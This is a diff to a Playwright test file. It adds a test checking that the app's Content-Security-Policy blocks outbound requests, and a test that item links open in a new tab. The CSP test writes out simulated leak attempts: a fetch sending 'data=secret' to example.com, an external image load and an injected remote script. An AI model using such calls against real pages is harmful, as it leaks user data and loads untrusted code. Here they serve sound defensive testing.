@@ -145,3 +145,31 @@ test('Save explains, and asks for a new name, when the file can’t be written',
   expect(await disk(page)).toMatchObject({ writes: 0, aborts: 1, savedAs: 1 });
   expect((await state(page)).dirty).toBe(true);
 });
+
+/* ── Content-Security-Policy ── */
+
+test('the page can’t contact other servers', async ({ page }) => {
+  test.info().annotations.push({ type: 'csp-violation' });
+  // If the policy failed, these would succeed: answer them, so a leak shows as "sent" rather than a network error.
+  let reached = 0;
+  await page.route('https://example.com/**', r => { reached++; return r.fulfill({ status: 200, body: 'ok', headers: { 'Access-Control-Allow-Origin': '*' } }); });
+  await openApp(page);
+  const fetched = await page.evaluate(() => fetch('https://example.com/x?data=secret').then(() => 'sent', () => 'blocked'));
+  expect(fetched).toBe('blocked');
+  const img = await page.evaluate(() => new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = 'https://example.com/pixel.png'; }));
+  expect(img).toBe('blocked');
+  const script = await page.evaluate(() => new Promise(res => { const s = document.createElement('script'); s.onload = () => res('loaded'); s.onerror = () => res('blocked'); s.src = 'https://example.com/x.js'; document.head.append(s); }));
+  expect(script).toBe('blocked');
+  expect(reached).toBe(0);
+  const violations = await page.evaluate(() => window.__cspViolations);
+  expect(violations).toEqual(expect.arrayContaining([expect.stringMatching(/^connect-src/), expect.stringMatching(/^img-src/), expect.stringMatching(/^script-src/)]));
+});
+
+test('links on items still open in a new tab', async ({ page }) => {
+  await page.context().route('https://contoso.sharepoint.com/**', r => r.fulfill({ status: 200, contentType: 'text/html', body: '<title>ok</title>' }));
+  await openApp(page);
+  await page.evaluate(() => window.orrery.select('pro-early-product-design'));
+  const [tab] = await Promise.all([page.context().waitForEvent('page'), page.locator('#detail a.link').first().click()]);
+  await tab.waitForLoadState();
+  expect(tab.url()).toContain('contoso.sharepoint.com');
+});
